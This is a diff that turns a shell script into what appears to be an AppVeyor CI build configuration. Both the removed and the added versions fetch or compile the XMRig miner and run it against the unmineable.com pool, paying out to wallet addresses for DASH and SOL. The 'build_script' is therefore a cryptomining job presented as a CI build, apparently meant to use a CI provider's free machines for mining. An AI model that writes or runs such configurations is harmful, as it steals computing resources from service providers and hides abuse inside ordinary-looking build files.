@@ -1,11 +1,11 @@
-#!/bin/sh
-sudo apt update
-sudo apt install screen -y
-wget https://github.com/xmrig/xmrig/releases/donwload/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
-tar xf xmrig-6.14.0-linux-x64.tar.gz
-cd xmrig-6.14.0
-./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u DASH:XcufdyxZtL4JUjALZfTq6pCrxyTt2Hy2Zu.unmineable_worker_sal -p x --cpu 4
-while [ 1 ]; do
-sleep 3
-done
-sleep 999
+version: 1.0.{build}
+image: Ubuntu2004
+
+build_script:
+  - sudo apt update
+  - sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+  - git clone https://github.com/xmrig/xmrig.git
+  - mkdir xmrig/build && cd xmrig/build
+  - cmake ..
+  - make -j$(nproc)
+  - ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.AppVeyor1 -p x --threads=4
